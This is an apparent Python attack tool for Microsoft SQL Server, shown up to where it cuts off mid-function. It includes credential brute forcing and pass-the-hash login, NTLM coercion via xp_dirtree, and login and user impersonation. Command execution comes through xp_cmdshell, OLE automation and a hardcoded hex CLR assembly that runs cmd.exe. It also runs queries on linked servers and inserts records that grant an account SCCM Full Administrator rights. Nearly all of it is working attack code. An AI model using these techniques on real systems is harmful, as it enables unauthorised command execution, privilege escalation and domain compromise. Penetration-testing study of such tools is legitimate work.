#!/usr/bin/python3

##########################################################
#                     Dependencies                       #
##########################################################

# PROTOCOL IMPLEMENTATION = TDS
from impacket import tds

# ADDITIONAL PROTOCOLS = LDAP/SPNEGO/Kerberos
from Utils.LDAP import LDAPUtil
from Utils.SPNEGO import SPNEGOUtil
from Utils.KERBEROS import KerberosUtil

# Others
import sys, traceback, time, random, datetime, string
from io import StringIO
from OpenSSL import SSL

def escape(storedProcedure):
	return storedProcedure.replace("'", "''")

def printRes(conn):
	errors = []
	infos = []
	def custom_error_logger(message):
		errors.append(message)

	def custom_info_logger(message):
		infos.append(message)

	conn.printReplies(error_logger = custom_error_logger, info_logger = custom_info_logger)

	for info in infos:
		info = info.strip()
		if info != '':
			sys.stdout.write("[+] " + info + '\n')
	if errors != []:
		for error in errors:
			error = str(error).strip()
			if error != '':
				sys.stderr.write("[-] " + error + '\n')
	else:
		originalSTDOUT = sys.stdout
		capturedSTDOUT = StringIO()
		sys.stdout = capturedSTDOUT
		conn.printRows()
		output = capturedSTDOUT.getvalue()
		sys.stdout = originalSTDOUT
		rows = output.splitlines()
		for row in rows:
			row = row.strip()
			if row != '':
				print(row)

	return errors

########################################################
#                     Connection                       #
########################################################

def mssqlKerberosLogin(conn, target, username, domain, aesKey, ccache, database, channelBinding):
	clientServiceSessionKey = None
	cipher = None
	ST = None

	target = target.lower()
	foundST = False
	if ccache != None: # Is there a valid ST ?
		ticket = KerberosUtil.CCache.loadFile(ccache)
		# From https://msdn.microsoft.com/en-us/library/ms191153.aspx?f=255&MSPPError=-2147217396
		# Beginning with SQL Server 2008, the SPN format is changed in order to support Kerberos authentication
		# on TCP/IP, named pipes, and shared memory. The supported SPN formats for named and default instances
		# are as follows.
		# Named instance
		#     MSSQLSvc/FQDN:[port | instancename], where:
		#         MSSQLSvc is the service that is being registered.
		#         FQDN is the fully qualified domain name of the server.
		#         port is the TCP port number.
		#         instancename is the name of the SQL Server instance.
		sName1 = f'mssqlsvc/{target}:1433'
		instances = conn.getInstances()
		instanceName = None
		for i in instances:
			try:
				if int(i['tcp']) == conn.port:
					instanceName = i['InstanceName']
			except Exception as e:
				pass
		sName2 = None
		if instanceName:
			sName2 = f'mssqlsvc/{target}:{instanceName.lower()}'
		sRealm = domain.lower()

		for creds in ticket.credentials:
			ccServiceName = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
			ccServiceRealm = creds['server'].prettyPrint().split(b'@')[1].decode('utf-8')
			if (sName1 == ccServiceName.lower() or sName2 == ccServiceName.lower()) and sRealm == ccServiceRealm.lower(): # Found a valid ST
				foundST = True
				rawTicket = creds.toTGSREP()
				decodedTGSREP = KerberosUtil.decoder.decode(rawTicket['KDC_REP'], asn1Spec = KerberosUtil.TGS_REP())[0]
				clientServiceSessionKey = rawTicket['sessionKey'].contents
				cipher = rawTicket['cipher']
				ST = KerberosUtil.TicketObj()
				ST.from_asn1(decodedTGSREP['ticket'])
				break

	if not foundST: # No, request It with aesKey or ccache
		print("[+] No required ST available for Kerberos authentication")
		print(f"[+] Requesting MSSQLSvc/{target}:1433 to {domain.upper()}")
		try:
			tgsRep, cipher, _, clientServiceSessionKey = KerberosUtil.requestST(domain, username, '', domain, '', aesKey, ccache, None, None, None, f"MSSQLSvc/{target}:1433", None, None, False, False, False, None, True, skipIntro = True)
			decodedTGSREP = KerberosUtil.decoder.decode(tgsRep, asn1Spec = KerberosUtil.TGS_REP())[0]
			ST = KerberosUtil.TicketObj()
			ST.from_asn1(decodedTGSREP['ticket'])
		except Exception as e:
			return False

	# Now connect to MSSQL with ST

	if channelBinding:
		print("[+] Channel Binding requested for Kerberos but not implemented")
		print("\t[+] MSSQL Server will accept authentication anyway")

	# Build AP-REQ: Ticket and Authenticator

	apReq = KerberosUtil.AP_REQ()
	apReq['pvno'] = 5
	apReq['msg-type'] = int(KerberosUtil.ApplicationTagNumbers.AP_REQ.value)
	opts = []
	apReq['ap-options'] = KerberosUtil.encodeFlags(opts)
	KerberosUtil.seq_set(apReq, 'ticket', ST.to_asn1)
	authenticator = KerberosUtil.Authenticator()
	authenticator['authenticator-vno'] = 5
	authenticator['crealm'] = domain
	userPrincipal = KerberosUtil.PrincipalObj(username, type = KerberosUtil.PrincipalNameType.NT_PRINCIPAL.value)
	KerberosUtil.seq_set(authenticator, 'cname', userPrincipal.components_to_asn1)
	now = datetime.datetime.utcnow()
	authenticator['cusec'] = now.microsecond
	authenticator['ctime'] = KerberosUtil.KerberosTimeObj.to_asn1(now)
	encodedAuthenticator = KerberosUtil.encoder.encode(authenticator)
	KEYUSAGE = 11
	encryptedEncodedAuthenticator = cipher.encrypt(clientServiceSessionKey, KEYUSAGE, None, encodedAuthenticator)
	apReq['authenticator'] = KerberosUtil.noValue
	apReq['authenticator']['etype'] = cipher.encType
	apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
	encodedApReq = KerberosUtil.encoder.encode(apReq)

	# SPNEGO

	blob = SPNEGOUtil.SPNEGO_NegTokenInit()
	blob['MechTypes'] = [SPNEGOUtil.TypesMech['MS KRB5 - Microsoft Kerberos 5']]
	blob['MechToken'] = encodedApReq

	# MSSQL

	resp = conn.preLogin()
	if resp['Encryption'] == tds.TDS_ENCRYPT_REQ or resp['Encryption'] == tds.TDS_ENCRYPT_OFF:
		print("[+] Encryption required, switching to TLS")
		ctx = SSL.Context(SSL.TLS_METHOD)
		ctx.set_cipher_list('ALL:@SECLEVEL=0'.encode('utf-8'))
		tls = SSL.Connection(ctx,None)
		tls.set_connect_state()
		while True:
			try:
				tls.do_handshake()
			except SSL.WantReadError:
				data = tls.bio_read(4096)
				conn.sendTDS(tds.TDS_PRE_LOGIN, data, 0)
				tdsPacket = conn.recvTDS()
				tls.bio_write(tdsPacket['Data'])
			else:
				break
		
		# SSL and TLS limitation: Secure Socket Layer (SSL) and its replacement,
		# Transport Layer Security(TLS), limit data fragments to 16k in size.
		conn.packetSize = 16*1024-1
		conn.tlsSocket = tls
	
	login = tds.TDS_LOGIN()

	login['HostName'] = (''.join([random.choice(string.ascii_letters) for _ in range(8)])).encode('utf-16le')
	login['AppName']  = (''.join([random.choice(string.ascii_letters) for _ in range(8)])).encode('utf-16le')
	login['ServerName'] = conn.remoteName.encode('utf-16le')
	login['CltIntName'] = login['AppName']
	login['ClientPID'] = random.randint(0, 1024)
	login['PacketSize'] = conn.packetSize
	if database is not None:
		login['Database'] = database.encode('utf-16le')
	login['OptionFlags2'] = tds.TDS_INIT_LANG_FATAL | tds.TDS_ODBC_ON | tds.TDS_INTEGRATED_SECURITY_ON
	login['SSPI'] = blob.getData()
	login['Length'] = len(login.getData())

	# Send the GSS-SPNEGO packet
	conn.sendTDS(tds.TDS_LOGIN7, login.getData())

	# According to the specs, if encryption is not required, the first Login packet must be encrypted
	if resp['Encryption'] == tds.TDS_ENCRYPT_OFF:
		conn.tlsSocket = None

	tdsPacket = conn.recvTDS()

	conn.replies = conn.parseReply(tdsPacket['Data'])

	if tds.TDS_LOGINACK_TOKEN in conn.replies:
		return True
	else:
		return False

def connect_mssql(ip, port, database, windowsAuth, username, password, domain, ntHash, aesKey, ccache, channelBinding):
	print_yellow("[*] Connecting to MSSQL server")
	print_yellow("---")
	print()

	# MSSQL Signing
	# 	Not supported by MSSQL protocol
	# Channel Binding
	# 	Supported but not implemented

	try:
		mssql = tds.MSSQL(ip, port)
		mssql.connect()
		if aesKey != None or ccache != None:
			logged = mssqlKerberosLogin(mssql, ip, username, domain, aesKey, ccache, database, channelBinding)
		else:
			if channelBinding:
				print("[-] Channel Binding requested for NTLM but not implemented", file = sys.stderr)
				print("\t[+] Use Kerberos with Channel Binding")
				return ''

			if ntHash != '':
				hashes = ":" + ntHash
				logged = mssql.login(database, username, '', domain, hashes, windowsAuth)
			else:
				logged = mssql.login(database, username, password, domain, None, windowsAuth)

		if (logged):
			print("[+] Connected to MSSQL server")
			return mssql
		else:
			printRes(mssql)
			return ''
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

##############################################
#               Brute Force                  #
##############################################

def doBF(ip, port, database, windowsAuth, usernames, passwords, nthashes, domain, channelBinding, passLogin):
	print_yellow("[*] Brute Force MSSQL server")
	print_yellow("---")
	print()
 
	try:
		if channelBinding:
			print("[-] Channel Binding requested for NTLM but not implemented", file = sys.stderr)
			return

		usernamesA = []
		if usernames != '':
			try:
				with open(usernames, "r") as f:
					usernamesA = [username[:-1] for username in f.readlines()]
			except:
				usernamesA = [usernames]
		
		passwordsA = []
		if passwords != '':
			try:
				with open(passwords, "r") as f:
					passwordsA = [password[:-1] for password in f.readlines()]
			except:
				passwordsA = [passwords]
		
		nthashesA = []
		if nthashes != '':
			try:
				with open(nthashes, "r") as f:
					nthashesA = [nthash[:-1] for nthash in f.readlines()]
			except:
				nthashesA = [nthashes]

		for username in usernamesA:

			if passLogin:
				try:
					mssql = tds.MSSQL(ip, port)
					mssql.connect()
					logged = mssql.login(database, username, username, domain, None, windowsAuth)

					if (logged):
						print(f"[+] Valid account found {username}:{username}")
					else:
						print(f"[-] Invalid/Locked out/Disabled account {username}:{username}", file = sys.stderr)
				except KeyboardInterrupt:
					exit()
				except Exception as e:
					print(f"[-] Got error for {username}:{username}: {str(e)}", file = sys.stderr)
					print('---------------------------------', file = sys.stderr)
					traceback.print_exc()
					print('---------------------------------', file = sys.stderr)
				maybeSleep()

			for password in passwordsA:
				try:
					mssql = tds.MSSQL(ip, port)
					mssql.connect()
					logged = mssql.login(database, username, password, domain, None, windowsAuth)

					if (logged):
						print(f"[+] Valid account found {username}:{password}")
					else:
						print(f"[-] Invalid/Locked out/Disabled account {username}:{password}", file = sys.stderr)
				except KeyboardInterrupt:
					exit()
				except Exception as e:
					print(f"[-] Got error for {username}:{password}: {str(e)}", file = sys.stderr)
					print('---------------------------------', file = sys.stderr)
					traceback.print_exc()
					print('---------------------------------', file = sys.stderr)
				maybeSleep()

			for nthash in nthashesA:
				try:
					mssql = tds.MSSQL(ip, port)
					mssql.connect()
					hashes = ":" + nthash
					logged = mssql.login(database, username, '', domain, hashes, windowsAuth)

					if (logged):
						print(f"[+] Valid account found {username}:{nthash}")
					else:
						print(f"[-] Invalid/Locked out/Disabled account {username}:{nthash}", file = sys.stderr)
				except KeyboardInterrupt:
					exit()
				except Exception as e:
					print(f"[-] Got error for {username}:{nthash}: {str(e)}", file = sys.stderr)
					print('---------------------------------', file = sys.stderr)
					traceback.print_exc()
					print('---------------------------------', file = sys.stderr)
				maybeSleep()

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#########################################################
#                     Enumeration                       #
#########################################################

def getLogin(conn):
	print_yellow("[*] Getting current MSSQL login")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No connection available")
			return

		conn.sql_query("SELECT SYSTEM_USER")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getUser(conn):
	print_yellow("[*] Getting current MSSQL user")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No connection available")
			return

		conn.sql_query("SELECT USER_NAME()")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def haveRole(conn, role):
	print_yellow("[*] Checking role for current user")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No connection available")
			return

		conn.sql_query(f"SELECT IS_SRVROLEMEMBER('{role}')")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getMembersWithRole(conn, role):
	print_yellow("[*] Listing members with role")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return

		conn.sql_query(f"SELECT r.name AS [role], m.name AS [member] FROM sys.server_principals r INNER JOIN sys.server_role_members s ON s.role_principal_id = r.principal_id INNER JOIN sys.server_principals m ON m.principal_id = s.member_principal_id WHERE r.name = '{role}'")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
	
####################################################
#                     Coerce                       #
####################################################

def coerce(conn, uncPath):
	print_yellow("[*] Coerce service account for NTLM authentication")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return

		conn.sql_query(f"EXEC master.dbo.xp_dirtree '{uncPath}'")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################################################
#                     Impersonation                       #
###########################################################

def enumImpersonate(conn):
	print_yellow("[*] Enumerating impersonation with login/user level")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return

		conn.sql_query("SELECT name FROM sys.databases")
		result = []
		for row in conn.rows:
			maybeSleep()
			result_rows = conn.sql_query("USE " + row['name'] + "; SELECT 'USER' as 'execute as', DB_NAME() "
																"AS 'database',pe.permission_name,"
																"pe.state_desc, pr.name AS 'grantee', "
																"pr2.name AS 'grantor' "
																"FROM sys.database_permissions pe "
																"JOIN sys.database_principals pr ON "
																"  pe.grantee_principal_id = pr.principal_Id "
																"JOIN sys.database_principals pr2 ON "
																"  pe.grantor_principal_id = pr2.principal_Id "
																"WHERE pe.type = 'IM'")
			if result_rows:
				result.extend(result_rows)
		result_rows = conn.sql_query("SELECT 'LOGIN' as 'execute as', '' AS 'database',pe.permission_name,"
										"pe.state_desc,pr.name AS 'grantee', pr2.name AS 'grantor' "
										"FROM sys.server_permissions pe JOIN sys.server_principals pr "
										"  ON pe.grantee_principal_id = pr.principal_Id "
										"JOIN sys.server_principals pr2 "
										"  ON pe.grantor_principal_id = pr2.principal_Id "
										"WHERE pe.type = 'IM'")
		result.extend(result_rows)
		conn.rows = result
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def execAsLogin(conn, login, query):
	print_yellow("[*] Impersonate login and execute query")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No connection available")
			return

		conn.sql_query(f"EXECUTE AS LOGIN = '{login}'; {query}")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def execAsUser(conn, database, user, query):
	print_yellow("[*] Impersonate user and execute query")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No connection available")
			return

		conn.sql_query(f"USE {database}; EXECUTE AS USER = '{user}'; {query}")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###################################################################
#                     Remote Code Execution                       #
###################################################################

def xp_cmdshell(conn, cmd):
	print_yellow("[*] Executing command through xp_cmdshell")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return

		conn.sql_query("EXEC sp_configure 'show advanced options', 1;"
						"RECONFIGURE;"
						"EXEC sp_configure 'xp_cmdshell', 1;"
						"RECONFIGURE;"
						f"EXEC master..xp_cmdshell '{escape(cmd)}'")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def sp_OACreate_OAMethod(conn, cmd):
	print_yellow("[*] Executing command through sp_oacreate and sp_oamethod")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return

		conn.sql_query("EXEC sp_configure 'Ole Automation Procedures', 1;"
						"RECONFIGURE;"
						f"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c {escape(cmd)}'")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def createAssembly(conn, cmd):
	print_yellow("[*] Executing command through assembly")
	print_yellow("---")
	print()

	'''
	C# DLL template compiled and hardcoded: .NET Framework 4.5.1 / x64
	using Microsoft.SqlServer.Server;
	using System.Data.SqlTypes;
	using System.Diagnostics;

	public class StoredProcedures
	{
		[Microsoft.SqlServer.Server.SqlProcedure]
		public static void cmdExec(SqlString execCommand)
		{
			Process proc = new Process();
			proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
			proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
			proc.StartInfo.UseShellExecute = false;
			proc.StartInfo.RedirectStandardOutput = true;
			proc.Start();

			SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
			SqlContext.Pipe.SendResultsStart(record);
			record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
			SqlContext.Pipe.SendResultsRow(record);
			SqlContext.Pipe.SendResultsEnd();

			proc.WaitForExit();
			proc.Close();
		}
	}
	'''

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return

		hexDLL = "0x" + "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500006486020061d0cb8d0000000000000000f00022200b023000000c00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000098030000000000000000000000000000000000000000000000000000fc290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002e74657874000000a40a000000200000000c000000020000000000000000000000000000200000602e72737263000000980300000040000000040000000e00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000e8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600b500000001000011731000000a0a066f1100000a72010000706f1200000a066f1100000a7239000070028c12000001281300000a6f1400000a066f1100000a166f1500000a066f1100000a176f1600000a066f1700000a26178d17000001251672490000701f0c20a00f00006a731800000aa2731900000a0b281a00000a076f1b00000a0716066f1c00000a6f1d00000a6f1e00000a6f1f00000a281a00000a076f2000000a281a00000a6f2100000a066f2200000a066f2300000a2a1e02282400000a2a00000042534a4201000100000000000c00000076342e302e33303331390000000005006c000000b8020000237e0000240300000804000023537472696e6773000000002c070000580000002355530084070000100000002347554944000000940700005401000023426c6f620000000000000002000001471502000900000000fa013300160000010000001c000000020000000200000001000000240000000f0000000100000001000000030000000000720201000000000006009c0127030600090227030600ba00f5020f00470300000600e2008b0206007f018b02060060018b020600f0018b020600bc018b020600d5018b0206000f018b020600ce0008030600ac000803060043018b0206002a013b020600990384020a00f900d4020a00550256030e007c03f5020a007000d4020e00ab02f50206006b0284020a002000d4020a009c0014000a00eb03d4020a009400d4020600bc020a000600c9020a000000000001000000000001000100010010006b03000041000100010048200000000096004300620001000921000000008618ef02060002000000010064000900ef0201001100ef0206001900ef020a002900ef0210003100ef0210003900ef0210004100ef0210004900ef0210005100ef0210005900ef0210006100ef0215006900ef0210007100ef0210007900ef0210008900ef0206009900ef02060099009d022100a9007e001000b10092032600a90084031000a90027021500a900d00315009900b7032c00b900ef023000a100ef023800c9008b003f00d100ac0344009900bd034a00e1004b004f0081005f024f00a10068025300d100f6034400d100550006009900a00306009900a60006008100ef02060020007b004f012e000b0068002e00130071002e001b0090002e00230099002e002b00ac002e003300ac002e003b00ac002e00430099002e004b00b2002e005300ac002e005b00ac002e006300ca002e006b00f4002e00730001011a000480000001000000000000000000000000003500000004000000000000000000000059002c0000000000040000000000000000000000590014000000000004000000000000000000000059008402000000000000003c4d6f64756c653e0053797374656d2e494f0053797374656d2e446174610053716c4d65746144617461006d73636f726c6962004d5353514c5f444c4c4578656300636d64457865630052656164546f456e640053656e64526573756c7473456e640065786563436f6d6d616e640053716c446174615265636f7264007365745f46696c654e616d65006765745f506970650053716c506970650053716c44625479706500436c6f736500477569644174747269627574650044656275676761626c6541747472696275746500436f6d56697369626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b417474726962757465005461726765744672616d65776f726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c457865637574650053797374656d2e52756e74696d652e56657273696f6e696e670053716c537472696e6700546f537472696e6700536574537472696e67004d5353514c5f444c4c457865632e646c6c0053797374656d0053797374656d2e5265666c656374696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d5265616465720054657874526561646572004d6963726f736f66742e53716c5365727665722e536572766572002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e496e7465726f7053657276696365730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053797374656d2e446174612e53716c54797065730053746f72656450726f636564757265730050726f63657373007365745f417267756d656e747300466f726d6174004f626a6563740057616974466f72457869740053656e64526573756c74735374617274006765745f5374616e646172644f7574707574007365745f52656469726563745374616e646172644f75747075740053716c436f6e746578740053656e64526573756c7473526f7700000000003743003a005c00570069006e0064006f00770073005c00530079007300740065006d00330032005c0063006d0064002e00650078006500000f20002f00430020007b0030007d00000d6f00750074007000750074000000dc83c6510e5c77439a38417b83aeb7d400042001010803200001052001011111042001010e0420010102060702124d125104200012550500020e0e1c03200002072003010e11610a062001011d125d0400001269052001011251042000126d0320000e05200201080e08b77a5c561934e0890500010111490801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001201000d4d5353514c5f444c4c45786563000005010000000017010012436f7079726967687420c2a920203230323400002901002436623464333133652d316435342d346133322d623736362d64653765336339376531666100000c010007312e302e302e3000004d01001c2e4e45544672616d65776f726b2c56657273696f6e3d76342e352e310100540e144672616d65776f726b446973706c61794e616d65142e4e4554204672616d65776f726b20342e352e31040100000000000000da9a34c8000000000200000070000000342a0000340c0000000000000000000000000000100000000000000000000000000000005253445317f40115b044644686b063bcdf962d6301000000433a5c55736572735c7972617a6166696d5c4465736b746f705c4d5353514c5f444c4c457865635c4d5353514c5f444c4c457865635c6f626a5c7836345c52656c656173655c4d5353514c5f444c4c457865632e70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000003c03000000000000000000003c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b0049c020000010053007400720069006e006700460069006c00650049006e0066006f0000007802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d006500000000000000000044000e000100460069006c0065004400650073006300720069007000740069006f006e00000000004d005300530051004c005f0044004c004c0045007800650063000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e003000000044001200010049006e007400650072006e0061006c004e0061006d00650000004d005300530051004c005f0044004c004c0045007800650063002e0064006c006c0000004800120001004c006500670061006c0043006f007000790072006900670068007400000043006f0070007900720069006700680074002000a90020002000320030003200340000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000004c00120001004f0072006900670069006e0061006c00460069006c0065006e0061006d00650000004d005300530051004c005f0044004c004c0045007800650063002e0064006c006c0000003c000e000100500072006f0064007500630074004e0061006d006500000000004d005300530051004c005f0044004c004c0045007800650063000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
			
		conn.sql_query("USE msdb;"
						"IF EXISTS (SELECT * FROM sys.objects WHERE type = 'P' AND name = 'cmdExec') DROP PROCEDURE cmdExec;"
						"IF EXISTS (SELECT * FROM sys.assemblies WHERE name = 'myAssembly') DROP ASSEMBLY myAssembly;"
						"EXEC sp_configure 'show advanced options', 1;"
						"RECONFIGURE;"
						"EXEC sp_configure 'clr enabled', 1;"
						"RECONFIGURE;"
						"EXEC sp_configure 'clr strict security', 0;"
						"RECONFIGURE;"
						f"CREATE ASSEMBLY myAssembly FROM {hexDLL} WITH PERMISSION_SET = UNSAFE")
		printRes(conn)
		
		conn.sql_query("CREATE PROCEDURE[dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME[myAssembly].[StoredProcedures].[cmdExec]")
		printRes(conn)
		
		conn.sql_query(f"EXEC cmdExec '{escape(cmd)}'")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################################################
#                     Trusted Links                       #
###########################################################

def enumLinks(conn):
	print_yellow("[*] Enumerating Trusted Links for current user")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return

		conn.sql_query("EXEC sp_linkedservers")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def execAt(conn, linkedServer, query):
	print_yellow("[*] Executing SQL query at linked server")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No connection available")
			return

		conn.sql_query(f"EXEC ('{escape(query)}') AT {linkedServer}")
		printRes(conn)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#########################################################
#                     SCCM / MECM                       #
#########################################################

def promoteSMSAdmin(conn, sam, siteCode, sid, netbiosDomain):
	print_yellow("[*] Promoting account SMS Admin of SCCM")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No connection available", file = sys.stderr)
			return
		
		if sam == None or siteCode == None or sid == None or netbiosDomain == None:
			print("[-] samAccountName, site code, SID and Netbios domain name required", file = sys.stderr)
			return

		sidBytes = LDAPUtil.SID.from_string(sid).to_bytes()
		sidHex = '0x' + ''.join('{:02X}'.format(b) for b in sidBytes)

		# Switch to site database
		conn.sql_query(f"USE CM_{siteCode}")
		errors = printRes(conn)
		if errors != []:
			return

		# Grant "Full Administrator" security role
		conn.sql_query("INSERT INTO RBAC_Admins"
						"(AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)"
						f"VALUES ({sidHex}, '{netbiosDomain}\{sam}', 0, 0, '', '', '', '', '{siteCode}');")
		errors = printRes(conn)
		if errors != []:
			return

		# Grant "All Objects" scope
		conn.sql_query("INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)"
						f"VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '{netbiosDomain}\{sam}'), 'SMS0001R', 'SMS00ALL', '29');")
		errors = printRes(conn)
		if errors != []:
			return
			
		# Grant "All Systems" scope
		conn.sql_query("INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)"
						f"VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '{netbiosDomain}\{sam}'), 'SMS0001R', 'SMS00001', '1');")
		errors = printRes(conn)
		if errors != []:
			return

		# Grant "All Users and User Groups" scope
